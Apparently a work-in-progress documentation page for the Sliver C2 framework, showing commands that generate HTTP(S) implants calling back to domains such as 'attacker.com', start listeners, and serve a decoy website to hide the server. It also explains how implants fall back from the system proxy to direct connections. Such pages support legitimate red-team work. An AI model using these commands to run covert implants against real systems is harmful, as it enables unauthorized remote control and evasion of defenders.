
⚠️ __This page is a work in progress__

# Setup

Sliver supports proxy-aware C2 over both HTTP and HTTPS, however since Sliver does not rely upon the SSL/TLS layer for security these protocols are considered somewhat synonymous. There are separate commands for the listeners but an implant generated with `--http` may attempt to connect over both HTTP and HTTPS (see "under the hood" for more details.
 

## Generate the Implant

Sliver implants are compiled with a baked-in (but obfuscated of course) server domain that they will reach back out to. To generate a sliver implant that communicates to a server at `example.com` run the following:

#### Basic Example

```
sliver > generate --http example.com --os mac

[*] Generating new darwin/amd64 implant binary
[*] Build completed in 00:00:05
[*] Implant saved to /Users/moloch/Desktop/WORKING_HACIENDA
```

#### Multiple Domains

You can also specify multiple domains, in the event the implant cannot connect to the first it will subsequently attempt to connect to each domain you specified in order. Subsequent attempts are made based on the `--reconnect` argument (default 60 seconds). If no attempts are successful, the implant will loop across all of the domains until `--max-errors` (default 1000) is reached, at which point the implant will terminate execution:

```
sliver > generate --http example.com,attacker.com

[*] Generating new windows/amd64 implant binary
[*] Build completed in 00:00:05
[*] Implant saved to /Users/moloch/Desktop/IMPRESSED_METHANE
```

#### Proxies

The implant attempts to auto-detect proxy settings using a modified version of the [go-get-proxied](https://github.com/rapid7/go-get-proxied) library. It supports detection of system proxy settings on Windows, MacOS, and Linux. In the event the implant cannot make a successful HTTP/HTTPS connection for a given domain using the system proxy settings, it will also attempt to make a connection to the same domain ignoring the proxy settings. The order of connection attempts is as follows:

1. HTTPS over system proxy
1. HTTP over system proxy
1. HTTPS direct connect
1. HTTP direct connect


## Start the Listener 

To start an HTTP listener use the `http` command, with no parameters this will start a listener on port 80 and respond to any domain (i.e., HTTP `Host:`) that comes in:

```
sliver > http
```

You can optionally restrict the listener to only respond to specific domains using the `--domain` flag:

```
sliver > http --domain example.com
```


## Static Content

Sliver can stand up a website on your HTTP(S) listener in order to make the server look more legitimate. For example, you could put a default IIS index page here and mimic a normal-looking server in case someone comes by snooping. You can manage static content using the `websites` command. 

```
websites --website fake-blog --web-path / --content ./index.html add
```


## SSL/TLS Certificates

The `http` listener also supports automatic TLS certificates via Let's Encrypt, which can be enabled using the `--lets-encrypt` flag.

```
sliver > https --domain example.com --lets-encrypt

```

# Under the Hood



